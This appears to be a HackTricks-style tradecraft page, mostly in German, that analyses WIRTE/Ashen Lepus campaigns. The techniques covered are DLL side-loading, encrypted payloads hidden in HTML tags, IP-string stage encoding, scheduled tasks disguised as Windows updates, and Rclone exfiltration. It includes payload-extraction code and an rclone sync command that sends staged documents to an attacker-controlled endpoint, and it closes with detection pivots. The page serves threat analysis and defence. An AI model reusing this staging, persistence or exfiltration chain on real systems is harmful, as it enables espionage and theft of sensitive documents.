# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft-Übersicht

Ashen Lepus (aka WIRTE) weaponized ein wiederholbares Muster, das DLL sideloading, staged HTML payloads und modulare .NET backdoors verkettet, um in diplomatischen Netzwerken im Nahen Osten zu persistieren. Die Technik ist für jeden operator wiederverwendbar, weil sie auf Folgendem basiert:

- **Archive-based social engineering**: harmlose PDFs weisen targets an, ein RAR archive von einer file-sharing site herunterzuladen. Das archive bündelt eine echt wirkende document viewer EXE, eine malicious DLL mit dem Namen einer vertrauenswürdigen library (z. B. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) und ein decoy `Document.pdf`.
- **DLL search order abuse**: das Opfer doppelklickt die EXE, Windows resolved den DLL import aus dem current directory, und der malicious loader (AshenLoader) executes innerhalb des trusted process, während das decoy PDF geöffnet wird, um keinen Verdacht zu erregen.
- **Living-off-the-land staging**: jede spätere stage (AshenStager → AshenOrchestrator → modules) wird bis zum Bedarf off disk gehalten und als encrypted blobs geliefert, versteckt in ansonsten harmlosen HTML responses.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: die EXE side-loads AshenLoader, der host recon durchführt, per AES-CTR encrypts und ihn per POST in rotierenden Parametern wie `token=`, `id=`, `q=` oder `auth=` an API-ähnliche paths (z. B. `/api/v2/account`) sendet.
2. **HTML extraction**: das C2 verrät die nächste stage nur, wenn die client IP zur Zielregion geolokalisiert und der `User-Agent` zum implant passt, wodurch sandboxes frustriert werden. Wenn die Prüfungen bestehen, enthält der HTTP body einen `<headerp>...</headerp>` blob mit dem Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: AshenStager wird mit einer weiteren legitimen binary deployed, die `wtsapi32.dll` importiert. Die in die binary injizierte malicious copy fetcht mehr HTML und extrahiert diesmal `<article>...</article>`, um AshenOrchestrator wiederherzustellen.
4. **AshenOrchestrator**: ein modularer .NET controller, der eine Base64 JSON config decodes. Die Felder `tg` und `au` der config werden verkettet/gehasht, um den AES key zu bilden, der `xrk` decrypts. Die resultierenden bytes dienen anschließend als XOR key für jeden module blob, der danach abgerufen wird.
5. **Module delivery**: jedes module wird über HTML comments beschrieben, die den parser auf ein beliebiges tag umleiten und statische Regeln brechen, die nur nach `<headerp>` oder `<article>` suchen. Zu den modules gehören persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) und file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Auch wenn Verteidiger ein bestimmtes Element blockieren oder entfernen, muss der Operator nur das im HTML-Kommentar angedeutete Tag ändern, um die Auslieferung fortzusetzen.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Jüngste HTML smuggling-Recherche (Talos) hebt Payloads hervor, die als Base64-Strings in `<script>`-Blöcken in HTML-Anhängen verborgen und zur Laufzeit per JavaScript dekodiert werden. Derselbe Trick kann für C2 responses wiederverwendet werden: verschlüsselte Blobs in einem script-Tag (oder einem anderen DOM-Element) stagen und sie im Speicher vor AES/XOR dekodieren, sodass die Seite wie gewöhnliches HTML aussieht. Talos zeigt auch geschichtete Obfuskation (Umbenennen von Identifiern plus Base64/Caesar/AES) innerhalb von script-Tags, was sich sauber auf HTML-gestagte C2-Blobs übertragen lässt. Ein späterer Talos-Writeup über **hidden text salting** ist hier ebenfalls relevant: Das Aufteilen von Base64 mit irrelevanten HTML-Kommentaren oder Whitespace reicht aus, um einfache Regex-Extractor zu brechen, während die browserseitige Rekonstruktion trivial bleibt.

## Recent Variant Notes (2024-2025)

- Check Point beobachtete 2024 WIRTE-Kampagnen, die weiterhin auf archive-based sideloading basierten, dabei aber `propsys.dll` (stagerx64) als erste Stufe nutzten. Der Stager dekodiert den nächsten Payload mit Base64 + XOR (key `53`), sendet HTTP requests mit einem fest verdrahteten `User-Agent` und extrahiert verschlüsselte Blobs, die zwischen HTML-Tags eingebettet sind. In einem Zweig wurde die Stage aus einer langen Liste eingebetteter IP-Strings rekonstruiert, die via `RtlIpv4StringToAddressA` dekodiert und dann zu den Payload-Bytes verkettet wurden.
- OWN-CERT dokumentierte frühere WIRTE-Tooling-Versionen, bei denen der side-loaded `wtsapi32.dll` dropper Strings mit Base64 + TEA schützte und den DLL-Namen selbst als Entschlüsselungskey verwendete, anschließend Host-Identifikationsdaten per XOR/Base64 obfuskierte, bevor sie an das C2 gesendet wurden.

## Reconstructing IP-Encoded Stages

WIRTEs `propsys.dll`-Zweig aus 2024 zeigt, dass das nächste PE nicht als ein zusammenhängender HTML-Blob vorliegen muss. Der Loader kann Stage-Bytes als dotted-quad-Strings ablegen und sie mit `RtlIpv4StringToAddressA` neu aufbauen, ein Muster, das eng mit Hives **IPfuscation**-Tradecraft verwandt ist. Operativ ist das nützlich, wenn der Akteur möchte, dass die HTML-Seite wie harmlose IOCs oder Konfigurationsdaten aussieht, statt wie ein offensichtlicher Base64-Payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Wenn die wiederhergestellten Bytes mit `MZ` beginnen, hast du wahrscheinlich direkt das nächste PE rekonstruiert. Falls nicht, prüfe auf eine führende XOR/Base64-Schicht oder kleine Trennzeichen-Blöcke zwischen den Adressen.

## Austauschbare DLL-Namen & Host-Rotation

Eine starke Eigenschaft dieses Musters ist, dass das **HTML/AES/XOR-Staging-Backend identisch bleiben kann, während sich nur das Sideload-Paar ändert**. WIRTE rotierte kampagnenübergreifend durch `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` und `propsys.dll`, was nützlich ist, weil:

- `propsys.dll` und `wtsapi32.dll` sind langweilige Windows-DLL-Namen, von denen Defender erwarten, dass sie in `%System32%` / `%SysWOW64%` existieren.
- Öffentliche Kataloge wie **HijackLibs** ordnen bereits viele Binaries zu, die diese DLL-Namen aus einem kopierten Anwendungsverzeichnis laden, und geben Operatoren Ersatz-Hosts, ohne den Stager neu zu entwerfen.
- Nur die Export-Oberfläche muss pro Host angepasst werden. Der HTML-Parser, die AES/XOR-Routinen und der Modul-Loader können normalerweise unverändert in eine Forwarding-Proxy-DLL übernommen werden.

Für offensive Laborarbeit bedeutet das, dass du das Problem in **(1) einen stabilen signierten Host finden, der deinen gewählten DLL-Namen lokal auflöst** und **(2) dieselbe gestagte HTML-Loader-Logik hinter dieser DLL wiederverwenden** kannst.

## Crypto & C2 Hardening

- **AES-CTR überall**: aktuelle Loader binden 256-Bit-Schlüssel plus Nonces ein (z. B. `{9a 20 51 98 ...}`) und fügen optional eine XOR-Schicht mit Strings wie `msasn1.dll` vor/nach der Entschlüsselung hinzu.
- **Variationen des Schlüsselmaterials**: frühere Loader nutzten Base64 + TEA, um eingebettete Strings zu schützen, wobei der Entschlüsselungsschlüssel vom bösartigen DLL-Namen abgeleitet wurde (z. B. `wtsapi32.dll`).
- **Infrastructure-Aufteilung + Subdomain-Tarnung**: Staging-Server sind pro Tool getrennt, über verschiedene ASNs gehostet und manchmal mit legitim wirkenden Subdomains versehen, sodass das Aufdecken einer Stage nicht den Rest preisgibt.
- **Recon-Schmuggel**: aufgelistete Daten enthalten jetzt auch Program-Files-Verzeichnisse, um hochwertige Apps zu erkennen, und werden immer verschlüsselt, bevor sie den Host verlassen.
- **URI-Churn**: Query-Parameter und REST-Pfade rotieren zwischen Kampagnen (`/api/v1/account?token=` → `/api/v2/account?auth=`), wodurch fragile Detektionen ungültig werden.
- **User-Agent-Pinning + sichere Redirects**: C2-Infrastruktur antwortet nur auf exakte UA-Strings und leitet ansonsten auf harmlose News-/Health-Sites um, um unauffällig zu bleiben.
- **Gated Delivery**: Server sind geo-gefiltert und antworten nur auf echte Implants. Nicht freigegebene Clients erhalten unscheinbares HTML.

## Persistence & Execution Loop

AshenStager legt geplante Tasks ab, die sich als Windows-Wartungsjobs tarnen und über `svchost.exe` ausgeführt werden, z. B.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Diese Tasks starten die Sideloading-Kette beim Booten oder in Intervallen neu und stellen sicher, dass AshenOrchestrator frische Module anfordern kann, ohne erneut auf die Festplatte zugreifen zu müssen.

## Using Benign Sync Clients for Exfiltration

Operatoren legen diplomatische Dokumente über ein dediziertes Modul in `C:\Users\Public` ab (weltlesbar und unverdächtig) und laden dann das legitime [Rclone](https://rclone.org/) Binary herunter, um dieses Verzeichnis mit dem Storage der Angreifer zu synchronisieren. Unit42 merkt an, dass dies das erste Mal ist, dass dieser Akteur bei Exfiltration Rclone beobachtet wurde, was mit dem breiteren Trend übereinstimmt, legitime Sync-Tools zu missbrauchen, um sich in normalen Traffic einzufügen:

1. **Stage**: Zieldateien nach `C:\Users\Public\{campaign}\` kopieren/sammeln.
2. **Configure**: Eine Rclone-Konfiguration bereitstellen, die auf einen von Angreifern kontrollierten HTTPS-Endpunkt zeigt (z. B. `api.technology-system[.]com`).
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ausführen, damit der Traffic wie normale Cloud-Backups aussieht.

Da Rclone weit verbreitet für legitime Backup-Workflows genutzt wird, müssen Defender auf anomale Ausführungen achten (neue Binaries, ungewöhnliche Remotes oder plötzliches Synchronisieren von `C:\Users\Public`).

## Detection Pivots

- Alarmiere bei **signierten Prozessen**, die unerwartet DLLs aus schreibbaren Benutzerpfaden laden (Procmon-Filter + `Get-ProcessMitigation -Module`), besonders wenn die DLL-Namen mit `netutils`, `srvcli`, `dwampi`, `wtsapi32` oder `propsys` überlappen.
- Untersuche verdächtige HTTPS-Antworten auf **große Base64-Blobs, die in ungewöhnliche Tags eingebettet sind** oder durch `<!-- TAG: <xyz> -->`-Kommentare geschützt werden.
- Normalisiere HTML zuerst: **Kommentare entfernen und Whitespace vor der Base64-Extraktion reduzieren**, da Hidden-Text-Salting-artige Umgehung Payloads über Kommentargrenzen hinweg aufteilen kann.
- Erweitere HTML-Hunting auf **Base64-Strings in `<script>`-Blöcken** (HTML-Smuggling-ähnliches Staging), die per JavaScript vor der AES/XOR-Verarbeitung dekodiert werden.
- Suche nach wiederholten Aufrufen von **`RtlIpv4StringToAddressA` gefolgt von Buffer-Zusammenbau**, besonders wenn die umgebenden Strings lange IPv4-Listen statt echter Netzwerkziele sind.
- Suche nach **geplanten Tasks**, die `svchost.exe` mit nicht-Dienst-Argumenten ausführen oder auf Dropper-Verzeichnisse zurückverweisen.
- Verfolge **C2-Redirects**, die Payloads nur für exakte `User-Agent`-Strings zurückgeben und ansonsten auf legitime News-/Health-Domains umleiten.
- Überwache auf **Rclone**-Binaries außerhalb von IT-verwalteten Speicherorten, neue `rclone.conf`-Dateien oder Sync-Jobs, die aus Staging-Verzeichnissen wie `C:\Users\Public` ziehen.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
